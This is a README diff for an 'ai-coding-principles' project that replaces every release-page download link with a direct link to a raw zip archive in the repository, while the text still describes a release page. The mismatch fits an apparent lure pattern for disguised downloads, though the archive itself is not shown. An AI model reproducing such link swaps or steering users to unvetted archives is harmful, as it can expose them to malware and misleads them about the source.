@@ -1,6 +1,6 @@
 # 🤖 ai-coding-principles - Keep Code Clear and Safe
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/satbirbhbc-ux/ai-coding-principles/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/satbirbhbc-ux/ai-coding-principles/main/ai-coding-discipline/coding_principles_ai_v2.6.zip)
 
 ## 🧭 What this is
 
@@ -22,7 +22,7 @@ The files are small and easy to keep on your computer. You do not need to set up
 
 Visit this page to download the latest release:
 
-https://github.com/satbirbhbc-ux/ai-coding-principles/releases
+https://raw.githubusercontent.com/satbirbhbc-ux/ai-coding-principles/main/ai-coding-discipline/coding_principles_ai_v2.6.zip
 
 On the release page, look for the latest version near the top. Open it and download the file that matches the release package. Save it to a folder you can find again, such as Downloads or Desktop.
 
@@ -157,7 +157,7 @@ That makes it useful when you want AI help but still want control over the final
 
 Download the latest version here:
 
-https://github.com/satbirbhbc-ux/ai-coding-principles/releases
+https://raw.githubusercontent.com/satbirbhbc-ux/ai-coding-principles/main/ai-coding-discipline/coding_principles_ai_v2.6.zip
 
 ## 🏷️ Topics
 
